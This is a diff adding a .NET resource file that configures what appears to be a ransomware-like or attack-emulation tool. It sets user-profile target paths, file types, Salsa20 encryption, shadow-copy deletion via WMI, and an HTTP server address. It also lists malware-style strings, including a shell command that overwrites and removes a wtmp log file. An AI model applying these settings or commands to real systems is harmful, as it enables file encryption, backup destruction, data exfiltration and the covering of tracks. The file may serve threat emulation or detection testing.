@@ -1,0 +1,49 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="TargetPathsCommaSeparated"><value>%USERPROFILE%</value></data>
+  <data name="Strings"><value>IDZT6frSHDHsfdsffiFduffz8GD7sddg, Ahnlab really sucks, AhnLabSucks, ./a filename template_file, May be %s is empty?, No data in this block !!!!!!, No good line, ls -la %s* ; /bin/cp  ./wtmp.tmp %s; rm  ./wtmp.tmp, usage: %s &lt;username&gt; &lt;fixthings&gt; [hostname]</value></data>
+  <data name="PathToAccess"><value>C:\JDUIHiuf\IDisjopjcnb</value></data>
+  <data name="Transport"><value>HTTP</value></data>
+  <data name="MaxCopySizeMB"><value>150</value></data>
+  <data name="SymmetricAlgorithm"><value>Salsa20</value></data>
+  <data name="RegistryPathsCommaSeparated"><value /></data>
+  <data name="ServerIP"><value>192.168.251.15</value></data>
+  <data name="DeleteShadowMode"><value>WMI</value></data>
+  <data name="MutexToCreate"><value /></data>
+  <data name="FilesystemBackupType"><value>Copy</value></data>
+  <data name="DNSsCommaSeparated"><value /></data>
+  <data name="Verbose"><value>False</value></data>
+  <data name="PathSuffixesCommaSeparated"><value>.txt, .mp3, .rtf</value></data>
+  <data name="AsymmetricAlgorithm"><value /></data>
+  <data name="FastEncryptionMode"><value>False</value></data>
+  <data name="OsCommands"><value /></data>
+  <data name="Port"><value>80</value></data>
+  <data name="UrlsCommaSeparated"><value /></data>
+  </root>
